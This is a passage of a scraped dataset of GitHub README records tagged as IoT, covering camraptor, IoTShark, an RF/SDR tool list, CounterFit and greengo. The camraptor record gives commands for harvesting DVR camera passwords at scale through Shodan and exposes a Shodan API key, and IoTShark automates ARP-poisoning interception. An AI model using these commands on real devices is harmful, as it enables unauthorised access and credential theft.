"MarkedSent": "camraptor\ncamraptor is a -----> tool !!!  that exploits several vulnerabilities in popular dvr cameras to obtain network camera credentials.\nfeatures\nexploits vulnerabilities in most popular camera models such as novo, cenova and qsee.\noptimized to exploit multiple cameras at one time from list with threading enabled.\nsimple cli and api usage.\ninstallation\npip3 install git+https://github.com/entysec/camraptor\nbasic usage\nto use camraptor just type camraptor in your terminal.\nusage: camraptor [-h] [-t] [-o output] [-i input] [-a address]\n[--shodan shodan] [--zoomeye zoomeye] [-p pages]\ncamraptor is a tool that exploits several vulnerabilities in popular dvr\ncameras to obtain network camera credentials.\noptional arguments:\n-h, --help show this help message and exit\n-t, --threads use threads for fastest work.\n-o output, --output output\noutput result to file.\n-i input, --input input\ninput file of addresses.\n-a address, --address address\nsingle address.\n--shodan shodan shodan api key for exploiting devices over internet.\n--zoomeye zoomeye zoomeye api key for exploiting devices over internet.\n-p pages, --pages pages\nnumber of pages you want to get from zoomeye.\nexamples\nexploiting single camera\nlet's hack my camera just for fun.\ncamraptor -a 192.168.99.100\nexploiting cameras from internet\nlet's try to use shodan search engine to exploit cameras over internet, we will use it with -t for fast exploitation.\ncamraptor -t --shodan pskindqe1gyxggecyz2191h2jos9qvgd\nnote: given shodan api key (pskindqe1gyxggecyz2191h2jos9qvgd) is my pro api key, you can use this key or your own, be free to use all our resources for free :)\nexploiting cameras from input file\nlet's try to use opened database of cameras with -t for fast exploitation.\ncamraptor -t -i cameras.txt -o passwords.txt\nnote: it will exploit all cameras in cameras.txt list by their addresses and save all obtained passwords to passwords.txt.\napi usage\ncamraptor also has their own python api that can be invoked by importing camraptor to your code.\nfrom camraptor import camraptor\nbasic functions\nthere are all camraptor basic functions that can be used to exploit specified camera.\nexploit(address) - exploit single camera by given address.\nexamples\nexploiting single camera\nfrom camraptor import camraptor\ncamraptor = camraptor()\ncreds = camraptor.exploit('192.168.99.100')\nprint(creds)", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000584, "year": null}, {"Unnamed: 0": 585, "autor": 585, "date": null, "content": "cs219-f19-final-project\nIoTShark\nThis is our final project for CS 219 for the Fall 2019 quarter.\nIoTShark is a IOT monitoring service that allows users to monitor their IOT devices for trends in data sent/received. Ordinarily, setting up a man in the middle attack with proper configurations can take up quite a bit of time, and may seem dauntingly impossible for those with little to no experience in computer security or even computer science.\nIoTShark aims to provide a [nearly] fully automated solution for a user to monitor their IOT devices by simply running a single script. The user merely has to select which device they wish to monitor, and this program takes care of the rest of the heavy work by starting the ARP poisoning, setting up the packet forwarding and the man in the middle packet sniffer. It also has an easy to understand and interactive web UI where a user can filter the packets based on the ports, types, and timestamps to get a broader understanding of how much and when things are being transmitted.\nWe also aim to classify certain kinds of data such as heartbeat messages, data transfers, and anomalies, though the last one will likely be demonstrated on the un-encrypted RPi test since it is difficult to do anomaly detection without huge amounts of data (and we would require many devices and individuals to gather that much data).\nHow to run:\nInstall the required libraries: pip3 install -r requirements.txt\nSet up the ip forwarding: sudo sysctl net.inet.ip.forwarding=1\nRun the app: sudo python3 iotshark.py\nThe Main Script\nCreate a Python virtual envionment and install dependency packages.\nvirtualenv --python=`which python3` venv\nsource venv/bin/activate\npip install -r requirements.txt\nMake sure packet forwarding is enabled on your local machine. This is necessary for man-in-the-middle attack to work. On macOS this can be done with:\nsudo sysctl net.inet.ip.forwarding=1\nRun the main program iotshark.py. See that script for accepted options.\nCurrently this program performs the following 4 actions:\nScan for all hosts either in the given subnet by the -s option or a set of common residential subnets\nDiscover the hardware vendor and OS of each host\nPerform ARP poisoning between the selected host and gateway router\nOutput graphs of past captured data by the -f option followed by relative path to csv file\nAfter ARP poisoning is running, you can examine traffic from the target device by Wireshark with a display filter like:\n(ip.src==192.168.0.215 or ip.dst==192.168.0.215) and tcp.port != 443\nData File Format\nThe captured data is stored in a csv file with the following format:\n{timestamp, incoming_bytes, outgoing_bytes, srcport, dstport, transfer_protocol, connection_protocol, srcip, dstip}\n123123213, 0, 240, 36, 80, 65124, HTTP, UDP, 192.168.0.215, 104.24.4.5\n123123240, 300, 0, 800, 443, 65125, HTTPS, TCP, 104.24.4.5, 192.168.0.215\nUsing the Tool to Sniff IoT Devices\nFor example, here is a long string that we can say to Alexa Echo Dot/Google Home while sniffing their traffic. Pay attention if the device is transmitting data before the wake word.\nIt is a dark and stormy night. My friends and I just came back from the Yosemite National Park, where the quick brown fox jumps over the lazy dog. Next week is Thanksgiving. Black Friday in 2019 is coming as well. It's a good time to do something exciting, such as taking a Computer Security class or a Programming Language class at UCLA. By the way, the first Airbus A380 jumbo jet is retiring. We like flying in that plane.\nWAKE_WORD, what is the weather like in Los Angeles on Thanksgiving?\nAnyways, we have Boeing 787 Dreamliners for cross-continental flights. The Web and Mobile System class with Ravi is amazing. We should upgrade the commercial laundry machine during the Black Friday sale. The bright and sunny weather is coming back and a trip to Joshua Tree National Park awaits. Well, I just saw a slow cat crashed into a new Android robot. There are some other robots made by Apple and Amazon too.", "link": "https://github.com/sahilmgandhi/IotShark", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "cs219-f19-final-project\niotshark\nthis is our final project for cs 219 for the fall 2019 quarter.\niotshark is a iot monitoring service that allows users to monitor their iot devices for trends in data sent/received. ordinarily, setting up a man in the middle attack with proper configurations can take up quite a bit of time, and may seem dauntingly impossible for those with little to no experience in computer security or even computer science.\niotshark aims to provide a [nearly] fully automated solution for a user to monitor their iot devices by simply running a single script. the user merely has to select which device they wish to monitor, and this program takes care of the rest of the heavy work by starting the arp poisoning, setting up the packet forwarding and the man in the middle packet sniffer. it also has an easy to understand and interactive web ui where a user can filter the packets based on the ports, types, and timestamps to get a broader understanding of how much and when things are being transmitted.\nwe also aim to classify certain kinds of data such as heartbeat messages, data transfers, and anomalies, though the last one will likely be demonstrated on the un-encrypted rpi test since it is difficult to do anomaly detection without huge amounts of data (and we would require many devices and individuals to gather that much data).\nhow to run:\ninstall the required libraries: pip3 install -r requirements.txt\nset up the ip forwarding: sudo sysctl net.inet.ip.forwarding=1\nrun the app: sudo python3 iotshark.py\nthe main script\ncreate a python virtual envionment and install dependency packages.\nvirtualenv --python=`which python3` venv\nsource venv/bin/activate\npip install -r requirements.txt\nmake sure packet forwarding is enabled on your local machine. this is necessary for man-in-the-middle attack to work. on macos this can be done with:\nsudo sysctl net.inet.ip.forwarding=1\nrun the main program iotshark.py. see that script for accepted options.\ncurrently this program performs the following 4 actions:\nscan for all hosts either in the given subnet by the -s option or a set of common residential subnets\ndiscover the hardware vendor and os of each host\nperform arp poisoning between the selected host and gateway router\noutput graphs of past captured data by the -f option followed by relative path to csv file\nafter arp poisoning is running, you can examine traffic from the target device by wireshark with a display filter like:\n(ip.src==192.168.0.215 or ip.dst==192.168.0.215) and tcp.port != 443\ndata file format\nthe captured data is stored in a csv file with the following format:\n{timestamp, incoming_bytes, outgoing_bytes, srcport, dstport, transfer_protocol, connection_protocol, srcip, dstip}\n123123213, 0, 240, 36, 80, 65124, http, udp, 192.168.0.215, 104.24.4.5\n123123240, 300, 0, 800, 443, 65125, https, tcp, 104.24.4.5, 192.168.0.215\nusing the -----> tool !!!  to sniff iot devices\nfor example, here is a long string that we can say to alexa echo dot/google home while sniffing their traffic. pay attention if the device is transmitting data before the wake word.\nit is a dark and stormy night. my friends and i just came back from the yosemite national park, where the quick brown fox jumps over the lazy dog. next week is thanksgiving. black friday in 2019 is coming as well. it's a good time to do something exciting, such as taking a computer security class or a programming language class at ucla. by the way, the first airbus a380 jumbo jet is retiring. we like flying in that plane.\nwake_word, what is the weather like in los angeles on thanksgiving?\nanyways, we have boeing 787 dreamliners for cross-continental flights. the web and mobile system class with ravi is amazing. we should upgrade the commercial laundry machine during the black friday sale. the bright and sunny weather is coming back and a trip to joshua tree national park awaits. well, i just saw a slow cat crashed into a new android robot. there are some other robots made by apple and amazon too.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000585, "year": null}, {"Unnamed: 0": 600, "autor": 600, "date": null, "content": "RFSec List\nIf you are a macOS user and you need to use cmake, remember to add the install prefix to avoid errors:\ncmake -DCMAKE_INSTALL_PREFIX=/opt/local ../\nIndex\nHardware\nSoftware\nMobile Communications\n4G - LTE\n3G - UMTS\n2G - GSM\nSIM/USIM\nSDR Software\nRF Tools\nADB-S\nGNURadio\nDockers\nCTF Tools\nHardware\nRTL2832U: RTL-SDR is a very cheap software defined radio that uses a DVB-T TV tuner dongle based on the RTL2832U chipset.\nHackRF: low cost software radio platform.\nOpera cake: (sometimes operacake) is an antenna switching add on board for HackRF.\nUSRP: The USRP software defined radio products are designed for RF applications from DC to 6 GHz, including multiple antenna (MIMO) systems.\nBladeRF: BladeRF is a Software Defined Radio (SDR) platform designed to enable a community of hobbyists, and professionals to explore and experiment with the multidisciplinary facets of RF communication. Nuand.com\nLimeSDR:LimeSDR is a low cost, open source, apps-enabled software defined radio (SDR) platform that can be used to support just about any type of wireless communication standard. Lime Microsystems\nPlutoSDR: PlutoSDR Firmware for the ADALM-PLUTO Active Learning Module. Adalm Pluto\nProxmark: The Proxmark is an RFID swiss-army tool, allowing for both high and low level interactions with the vast majority of RFID tags and systems world-wide. Originally built by Jonathan Westhues over 10 years ago, the device has progressively evolved into the industry standard tool for RFID Analysis.\nChameleonMini/Tiny: Powerful and portable RFID Emulation multi-tool with Bluetooth functionality.\nSoftware\nMobile Communications\n4G - LTE\nOpenLTE: An open source implementation of the 3GPP LTE specifications. USRP recommended. + OpenLTE Manual. Clone with documentation in mgp25/OpenLTE.\nOpenAirInterface: a separate legal entity from EURECOM, which aims to provide an open-source ecosystem for the core (EPC) and access-network (EUTRAN) protocols of 3GPP cellular systems with the possibility of interoperating with closed-source equipment in either portion of the network.\nOpenAirInterface5G: OpenAirInterface 5G Wireless Implementation.\nsrsLTE: Open source SDR LTE software suite.\nIMDEA-OWL: OWL stands for Online Watcher of LTE. imdeaOWL is a free and open-source LTE control channel decoder developed by IMDEA Networks Institute and based on srsLTE, an LTE library for SDR UE and eNodeB developed by SRS\nLTE Cell Scanner: OpenCL, SDR, TDD/FDD LTE cell scanner. + Detected cells somewhere in Madrid, Spain\n3G - UMTS\nOpenUMTS: An open source implementation of the 3GPP UMTS specifications. + OpenUMTS Manual\n2G - GSM\nOpenBTS: GSM+GPRS Radio Access Network Node.\nYateBTS: YateBTS is a software implementation of a GSM/GPRS radio access network based on Yate and is compatible with both GSM/GPRS SS7 MAP and LTE IMS core networks integrated in our YateUCN unified core network server.\nevilBTS: Yate and YateBTS specific versions ( plus patches ) that are working with the BladeRF by @evilsocket.\nFakeBTS: The aim of FakeBTS project is to detect fake BTS stations and prevent attacks, using a Linux computer and hardware that allows us to scan the frequencies of GSM/GPRS.\nIMSI Catcher: This program show you IMSI numbers of cellphones around you.\nSIM/USIM\npySim: Python-language program that can be used to program (write) certain fields/parameters on so-called programmable SIM/USIM cards.\nsysmo-usim-tool: Python language utility to configure the vendor-specific parameters of sysmoUSIM-SJS1 programmable USIM cards.\nOPC Calculator: Python script that calculates OPC from Ki and OP values.\nSDR SoftWare\nSigDigger: Qt-based digital signal analyzer, using Suscan core and Sigutils DSP library. \u2b50\ufe0f\u2b50\ufe0f\u2b50\ufe0f (My personal favorite and has MacOs Support \u2665\ufe0f).\nGQRX: Software defined radio receiver powered by GNU Radio and Qt\nSDRSharp: Airspy is a popular, affordable SDR (software defined radio) based communication receiver with the highest performance and the smallest form factor. It is a serious alternative to both cost sensitive and higher end scanners while featuring the best radio browsing experience of the market thanks to the tight integration with the de facto standard SDR# software.@airspy_com\nSDR_Console: SDR-Radio.com is a Windows console for Software Defined Radio (SDR) receivers and transceivers. Designed for the commercial, government, amateur radio and short-wave listener communities, the software provides a powerful interface for all SDR users. Suport Hardware List\nHDSDR: HDSDR is a freeware Software Defined Radio (SDR) program for Microsoft Windows 2000/XP/Vista/7/8/8.1/10.\nCubicSDR: Cross-Platform Software-Defined Radio Application\nsdrangel: SDR Rx/Tx software for Airspy, BladeRF, HackRF, LimeSDR, RTL-SDR, SDRplay RSP1 and FunCube\nshinysdr: Software-defined radio receiver application built on GNU Radio with a web-based UI and plugins. In development, usable but incomplete. Compatible with RTL-SDR.\nopenwebrx: Open source, multi-user SDR receiver software with a web interface.\nluaradio: A lightweight, embeddable software-defined radio framework built on LuaJIT.\nqspectrumanalyzer: Spectrum analyzer for multiple SDR platforms (PyQtGraph based GUI for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends)\nPandwaRF: PandwaRF: RF analysis tool with a sub-1 GHz wireless transceiver controlled by a smartphone.\nPSDR: PortableSDR - A Stand Alone HF Software Defined Transciever.\nspektrum: Spektrum is spectrum analyzer software for use with rtl-sdr.\nOpenUSRP: Using LimeSDR to simulate USRP B210,OpenUSRP can using LimeSDR to simulate USRP B210 Device\nkalibrate-rtl: GSM frequency scanner and frequency offset calculator use with rtl-sdr devices\nkalibrate-hackrf: kalibrate for hackrf\nkalibrate-bladeRF: kalibrate for bladeRF\nRF Tools\nAudacity: Audacity is free, open source, cross-platform audio software for multi-track recording and editing.\nBaudline: Baudline is a time-frequency browser designed for scientific visualization of the spectral domain. Signal analysis is performed by Fourier, correlation, and raster transforms that create colorful spectrograms with vibrant detail.\nInspectrum: Inspectrum is a tool for analysing captured signals, primarily from software-defined radio receivers.\nDspectrum: Automated RF/SDR Signal Analysis.\nrtl_433 :Application using librtlsdr to decode the temperature from a wireless temperature sensor.\nooktools :On-off keying tools for your SDR.\nTempestSDR: Remote video eavesdropping using a software-defined radio platform.\ngps-sdr-sim: GPS-SDR-SIM generates GPS baseband signal data streams, which can be converted to RF using software-defined radio (SDR) platforms, such as bladeRF, HackRF, and USRP.\nproxmark3: RRG / Iceman repo, the most totally wicked repo around if you are into Proxmark3 and RFID hacking.\nChameleonMini: The ChameleonMini is a versatile contactless smartcard emulator compliant to NFC.\nADS-B\ndump1090_sdrplus: Dump1090_sdrplus is a Mode S decoder for Software Defined Radio (SDR) devices including RTL SDR, HackRF, Airspy and SDRplay.\npyModeS: The Python Decoder for ADS-B (DF17) and Enhance Mode-S (DF20/21).\nMode S: An Open access book on Mode-S/ADS-B decoding and related topics.\ngraphs1090: Graphs for dump1090-fa (based on dump1090-tools by mutability)\nGNURadio\ngr-tempest: An implementation of TEMPEST in GNU Radio.\ngr-gsm: GNUradio blocks and tools for receiving GSM transmissions.\ngr-lte: The gr-lte project is an Open Source Software Package which aims to provide a GNU Radio LTE Receiver to receive, synchronize and decode LTE signals.\ngr-correctiq: GNURadio blocks to remove that IQ DC spike just like some software and drivers do! Three techniques available: auto, auto-tune to dc offset, and manual.\ngr-cc11xx: GNU Radio OOT module for communicating with TI CC11xx based devices.\nDockers\nOoktools: docker run -it --rm --privileged -v $(pwd):/data treemo/ooktools\nCTF Tools\nCTS Tools: These are client tools used to connect to the CTS infrastructure and receive RF data (IQ samples) over IP. They need a working GNU Radio 3.7 installation, they're headless, and are configured via command-line options.", "link": "https://github.com/mgp25/RF-List", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "rfsec list\nif you are a macos user and you need to use cmake, remember to add the install prefix to avoid errors:\ncmake -dcmake_install_prefix=/opt/local ../\nindex\nhardware\nsoftware\nmobile communications\n4g - lte\n3g - umts\n2g - gsm\nsim/usim\nsdr software\nrf tools\nadb-s\ngnuradio\ndockers\nctf tools\nhardware\nrtl2832u: rtl-sdr is a very cheap software defined radio that uses a dvb-t tv tuner dongle based on the rtl2832u chipset.\nhackrf: low cost software radio platform.\nopera cake: (sometimes operacake) is an antenna switching add on board for hackrf.\nusrp: the usrp software defined radio products are designed for rf applications from dc to 6 ghz, including multiple antenna (mimo) systems.\nbladerf: bladerf is a software defined radio (sdr) platform designed to enable a community of hobbyists, and professionals to explore and experiment with the multidisciplinary facets of rf communication. nuand.com\nlimesdr:limesdr is a low cost, open source, apps-enabled software defined radio (sdr) platform that can be used to support just about any type of wireless communication standard. lime microsystems\nplutosdr: plutosdr firmware for the adalm-pluto active learning module. adalm pluto\nproxmark: the proxmark is an rfid swiss-army -----> tool !!! , allowing for both high and low level interactions with the vast majority of rfid tags and systems world-wide. originally built by jonathan westhues over 10 years ago, the device has progressively evolved into the industry standard tool for rfid analysis.\nchameleonmini/tiny: powerful and portable rfid emulation multi-tool with bluetooth functionality.\nsoftware\nmobile communications\n4g - lte\nopenlte: an open source implementation of the 3gpp lte specifications. usrp recommended. + openlte manual. clone with documentation in mgp25/openlte.\nopenairinterface: a separate legal entity from eurecom, which aims to provide an open-source ecosystem for the core (epc) and access-network (eutran) protocols of 3gpp cellular systems with the possibility of interoperating with closed-source equipment in either portion of the network.\nopenairinterface5g: openairinterface 5g wireless implementation.\nsrslte: open source sdr lte software suite.\nimdea-owl: owl stands for online watcher of lte. imdeaowl is a free and open-source lte control channel decoder developed by imdea networks institute and based on srslte, an lte library for sdr ue and enodeb developed by srs\nlte cell scanner: opencl, sdr, tdd/fdd lte cell scanner. + detected cells somewhere in madrid, spain\n3g - umts\nopenumts: an open source implementation of the 3gpp umts specifications. + openumts manual\n2g - gsm\nopenbts: gsm+gprs radio access network node.\nyatebts: yatebts is a software implementation of a gsm/gprs radio access network based on yate and is compatible with both gsm/gprs ss7 map and lte ims core networks integrated in our yateucn unified core network server.\nevilbts: yate and yatebts specific versions ( plus patches ) that are working with the bladerf by @evilsocket.\nfakebts: the aim of fakebts project is to detect fake bts stations and prevent attacks, using a linux computer and hardware that allows us to scan the frequencies of gsm/gprs.\nimsi catcher: this program show you imsi numbers of cellphones around you.\nsim/usim\npysim: python-language program that can be used to program (write) certain fields/parameters on so-called programmable sim/usim cards.\nsysmo-usim-tool: python language utility to configure the vendor-specific parameters of sysmousim-sjs1 programmable usim cards.\nopc calculator: python script that calculates opc from ki and op values.\nsdr software\nsigdigger: qt-based digital signal analyzer, using suscan core and sigutils dsp library. \u2b50\ufe0f\u2b50\ufe0f\u2b50\ufe0f (my personal favorite and has macos support \u2665\ufe0f).\ngqrx: software defined radio receiver powered by gnu radio and qt\nsdrsharp: airspy is a popular, affordable sdr (software defined radio) based communication receiver with the highest performance and the smallest form factor. it is a serious alternative to both cost sensitive and higher end scanners while featuring the best radio browsing experience of the market thanks to the tight integration with the de facto standard sdr# software.@airspy_com\nsdr_console: sdr-radio.com is a windows console for software defined radio (sdr) receivers and transceivers. designed for the commercial, government, amateur radio and short-wave listener communities, the software provides a powerful interface for all sdr users. suport hardware list\nhdsdr: hdsdr is a freeware software defined radio (sdr) program for microsoft windows 2000/xp/vista/7/8/8.1/10.\ncubicsdr: cross-platform software-defined radio application\nsdrangel: sdr rx/tx software for airspy, bladerf, hackrf, limesdr, rtl-sdr, sdrplay rsp1 and funcube\nshinysdr: software-defined radio receiver application built on gnu radio with a web-based ui and plugins. in development, usable but incomplete. compatible with rtl-sdr.\nopenwebrx: open source, multi-user sdr receiver software with a web interface.\nluaradio: a lightweight, embeddable software-defined radio framework built on luajit.\nqspectrumanalyzer: spectrum analyzer for multiple sdr platforms (pyqtgraph based gui for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends)\npandwarf: pandwarf: rf analysis tool with a sub-1 ghz wireless transceiver controlled by a smartphone.\npsdr: portablesdr - a stand alone hf software defined transciever.\nspektrum: spektrum is spectrum analyzer software for use with rtl-sdr.\nopenusrp: using limesdr to simulate usrp b210,openusrp can using limesdr to simulate usrp b210 device\nkalibrate-rtl: gsm frequency scanner and frequency offset calculator use with rtl-sdr devices\nkalibrate-hackrf: kalibrate for hackrf\nkalibrate-bladerf: kalibrate for bladerf\nrf tools\naudacity: audacity is free, open source, cross-platform audio software for multi-track recording and editing.\nbaudline: baudline is a time-frequency browser designed for scientific visualization of the spectral domain. signal analysis is performed by fourier, correlation, and raster transforms that create colorful spectrograms with vibrant detail.\ninspectrum: inspectrum is a tool for analysing captured signals, primarily from software-defined radio receivers.\ndspectrum: automated rf/sdr signal analysis.\nrtl_433 :application using librtlsdr to decode the temperature from a wireless temperature sensor.\nooktools :on-off keying tools for your sdr.\ntempestsdr: remote video eavesdropping using a software-defined radio platform.\ngps-sdr-sim: gps-sdr-sim generates gps baseband signal data streams, which can be converted to rf using software-defined radio (sdr) platforms, such as bladerf, hackrf, and usrp.\nproxmark3: rrg / iceman repo, the most totally wicked repo around if you are into proxmark3 and rfid hacking.\nchameleonmini: the chameleonmini is a versatile contactless smartcard emulator compliant to nfc.\nads-b\ndump1090_sdrplus: dump1090_sdrplus is a mode s decoder for software defined radio (sdr) devices including rtl sdr, hackrf, airspy and sdrplay.\npymodes: the python decoder for ads-b (df17) and enhance mode-s (df20/21).\nmode s: an open access book on mode-s/ads-b decoding and related topics.\ngraphs1090: graphs for dump1090-fa (based on dump1090-tools by mutability)\ngnuradio\ngr-tempest: an implementation of tempest in gnu radio.\ngr-gsm: gnuradio blocks and tools for receiving gsm transmissions.\ngr-lte: the gr-lte project is an open source software package which aims to provide a gnu radio lte receiver to receive, synchronize and decode lte signals.\ngr-correctiq: gnuradio blocks to remove that iq dc spike just like some software and drivers do! three techniques available: auto, auto-tune to dc offset, and manual.\ngr-cc11xx: gnu radio oot module for communicating with ti cc11xx based devices.\ndockers\nooktools: docker run -it --rm --privileged -v $(pwd):/data treemo/ooktools\nctf tools\ncts tools: these are client tools used to connect to the cts infrastructure and receive rf data (iq samples) over ip. they need a working gnu radio 3.7 installation, they're headless, and are configured via command-line options.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000600, "year": null}, {"Unnamed: 0": 606, "autor": 606, "date": null, "content": "CounterFit\nIoT is great fun, but has a downside - hardware. You need access to a range of devices such as sensors and actuators to build your IoT projects. Sometimes you might have these devices, other times you may not - maybe you are waiting for a delivery, or parts are out of stock, or they are too expensive.\nThat's where this tool comes in.\nWhat is CounterFit\nCounterFit is a tool that is designed to fake various IoT hardware components, such as LEDs, buttons, temperature sensors and the like, that you can then access from IoT device code running on your computer rather than on an IoT device. It is made of two parts:\nThe CounterFit app - this is a web app run locally where you can connect fake sensors and actuators to your virtual hardware\nShims - these are libraries that fake popular hardware APIs so you can take code that runs against well known hardware and run it against the CounterFit app.\nThis project is under construction\nThis project is seriously under construction! Please let me know if you want to help.\nInstalling and running the app\nInstall the CounterFit app:\npip install CounterFit\nRun the app:\ncounterfit\nThe app will launch, listening for web requests on port 5000, and open a web browser for you to start adding virtual sensors and actuators to your project\nRunning on a different port\nTo use a different port than the default 5000, set the --port option when you run the app:\ncounterfit --port 5050\nShims\nThe shims are designed to mimic the APIs for popular hardware components. The idea being you should be able to take code built against the shim and eventually run it on real hardware by changing the name of the package that is imported.\nAvailable shims\nGrove.Py shims that work with the Seeed Grove ecosystem.\nSeeed DHT shims that work with the Seeed DHT sensors.\nSamples\nCheck out the samples directory for a range of samples.", "link": "https://github.com/CounterFit-IoT/CounterFit", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "counterfit\niot is great fun, but has a downside - hardware. you need access to a range of devices such as sensors and actuators to build your iot projects. sometimes you might have these devices, other times you may not - maybe you are waiting for a delivery, or parts are out of stock, or they are too expensive.\nthat's where this -----> tool !!!  comes in.\nwhat is counterfit\ncounterfit is a tool that is designed to fake various iot hardware components, such as leds, buttons, temperature sensors and the like, that you can then access from iot device code running on your computer rather than on an iot device. it is made of two parts:\nthe counterfit app - this is a web app run locally where you can connect fake sensors and actuators to your virtual hardware\nshims - these are libraries that fake popular hardware apis so you can take code that runs against well known hardware and run it against the counterfit app.\nthis project is under construction\nthis project is seriously under construction! please let me know if you want to help.\ninstalling and running the app\ninstall the counterfit app:\npip install counterfit\nrun the app:\ncounterfit\nthe app will launch, listening for web requests on port 5000, and open a web browser for you to start adding virtual sensors and actuators to your project\nrunning on a different port\nto use a different port than the default 5000, set the --port option when you run the app:\ncounterfit --port 5050\nshims\nthe shims are designed to mimic the apis for popular hardware components. the idea being you should be able to take code built against the shim and eventually run it on real hardware by changing the name of the package that is imported.\navailable shims\ngrove.py shims that work with the seeed grove ecosystem.\nseeed dht shims that work with the seeed dht sensors.\nsamples\ncheck out the samples directory for a range of samples.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000606, "year": null}, {"Unnamed: 0": 619, "autor": 619, "date": null, "content": "Infra as Code for AWS IoT Greengrass\nGreengo: a tool, and a starter boilerplate project to bring up (and clean-up!) AWS Greengrass setup for play and profit. If you followed the GreenGrass Getting Started Guide, here you find it automated, as code.\nDescribe your Greengrass group in group.yaml, write Lambda functions and device clients, provision Greengrass Core in Vagrant VM, deploy, and clean up.\nInspired by aws-iot-elf (Extremely Low Friction) and aws-greengrass-group-setup.\nPre-requisits\nA computer with Linux/MacOS, Python, git (dah!)\nVagrant with VirtualBox\nAWS CLI installed and configured. Consider using named profiles.\nSet it Up\nInstall greengo from PyPI:\n$ pip install greengo\nManually [*] download GreenGrassCore binary and place it in the ./downloads directory. Sign in to the AWS Management Console, navigate to the AWS IoT console, and download the AWS Greengrass Core Software from [Software section](https://us-west-2.console.aws.amazon.com/iotv2/home?region=us-west-2#/ software/greengrass). Yeah, manual sucks... I will automate it later. Or, submit your PR!\nPlay\nCreate GreenGrass Group definition in AWS\nFancy yourself with the group definitions in group.yaml, and run greengo:\n$ greengo create\nWhen runs with no errors, it creates all greengrass group artefacts on AWS and places certificates and config.json for GreenGrass Core in ./certs and ./config for Vagrant to use in provisioning on next step.\nProvision VM with GreenGrass Core with Vagrant\n$ vagrant up\nDeploy Greengrass Group to the Core on the VM.\n$ greengo deploy\nCheck that everything works - see the \"Check\" section below.\nProfit !\nWork on it: create, change or remove Lambda functions, subscriptions, resources, and then update Greengrass.\n$ greengo update\nApply your changes by deploying it again:\n$ greengo deploy\nClean-up when done playing.\nRemove the group definitions on AWS:\n$ greengo remove\nDitch the Vagrant VM:\n$ vagrant destroy\nFor any of the above commands you may specify a different yaml file using\n$ greengo --config_file <name>.yaml <command>\nwhere <name> is the name of your yaml and <command> is whatever you wish to run\nNOTE: If you want to create a new group but keep the Greengrass Core in the same Vagrant VM, you must update it with newly generated certificates and config.json file before deploying the group, and also reset deployment by getting the deployments/group/group.json back to virgin.\nTo do it: login to the Greengrass Vagrant VM and run /vagrant/scripts/update_ggc.sh on the Vagrant VM.\nDetails\nCheck the deployment\nHow to be sure everything something works? Follow this:\nCreate greengrass group in AWS IoT: greengo create.\nPrepare GGC on the VM: update certificates, reset group.json, restart the greengrassd.\nDeploy with greengo deploy. Check:\nCheck the deployment status, should be 'Success'\nExplore Greengrass Core on your vagrant VM.\nLogin to Vagrant VM. You should nkow Vagrant but for the off case: vagrant ssh.\nCheck the GGC logs runtime.log and python_runtime.log under /greengrass/ggc/var/log/system. Runtime log should have a line about starting your lambda, or an error why the funtion is not started. In many cases (like not enough memory for Lambda), the deployment is 'Success' but the function fails to start. The errors can only be seen in the runtime.log. If the function starts successfully, runtime.log will contain a message like\n[2018-03-31T08:48:40.57Z][INFO]-Starting worker arn:aws:lambda:us-west-2:0000000000:function:GreengrassHelloWorld:12\nFind and check your own Lambda log under /greengrass/ggc/var/log/system.\nCheck the greengrassd process: ps aux | grep greengrassd. Depending on deployment you might have several processes.\nIn AWS console, check the MQTT topic with IoT MQTT Test page:\nREGION=`aws configure get region`; open https://$REGION.console.aws.amazon.com/iot/home?region=$REGION#/test\nSubscribe to the topic (e.g., hello/world), see the messages sent by the Greengrass Lambda function.\nWhen something goes wrong\nAt this time greengo is just a prototype, a work-in-progress. Therefore it's not if but when somethings throws out, leaving the setup in half-deployed, and you gotta pick up the pieces. Remember:\nYou are still not worse off doing this manually: you at least have all the ARN and Id of all resources to clean-up.\nDON'T DELETE .gg/gg_state.json file: it contains references to everything you need to delete. Copy it somewhere and use the Id and Arn of created resources to clean up the pieces.\nDo what it takes to roll forward - if you're close to successful deployment, or roll-back - to clean things up and start from scratch.\nPlease pay forward: PR a patch to whatever broke for you to prevent it from happening again.\nDevelopment\nClone the project, set up your environment, install dependencies and setup greengo CLI in dev mode:\n$ git clone https://github.com/dzimine/greengo.git\n$ cd greengo\n$ virtualenv venv\n$ . venv/bin/activate\n$ pip install -r requirements.txt\n$ pip install -e .\nRun the unit tests:\npytest -s", "link": "https://github.com/dzimine/greengo", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "infra as code for aws iot greengrass\ngreengo: a -----> tool !!! , and a starter boilerplate project to bring up (and clean-up!) aws greengrass setup for play and profit. if you followed the greengrass getting started guide, here you find it automated, as code.\ndescribe your greengrass group in group.yaml, write lambda functions and device clients, provision greengrass core in vagrant vm, deploy, and clean up.\ninspired by aws-iot-elf (extremely low friction) and aws-greengrass-group-setup.\npre-requisits\na computer with linux/macos, python, git (dah!)\nvagrant with virtualbox\naws cli installed and configured. consider using named profiles.\nset it up\ninstall greengo from pypi:\n$ pip install greengo\nmanually [*] download greengrasscore binary and place it in the ./downloads directory. sign in to the aws management console, navigate to the aws iot console, and download the aws greengrass core software from [software section](https://us-west-2.console.aws.amazon.com/iotv2/home?region=us-west-2#/ software/greengrass). yeah, manual sucks... i will automate it later. or, submit your pr!\nplay\ncreate greengrass group definition in aws\nfancy yourself with the group definitions in group.yaml, and run greengo:\n$ greengo create\nwhen runs with no errors, it creates all greengrass group artefacts on aws and places certificates and config.json for greengrass core in ./certs and ./config for vagrant to use in provisioning on next step.\nprovision vm with greengrass core with vagrant\n$ vagrant up\ndeploy greengrass group to the core on the vm.\n$ greengo deploy\ncheck that everything works - see the 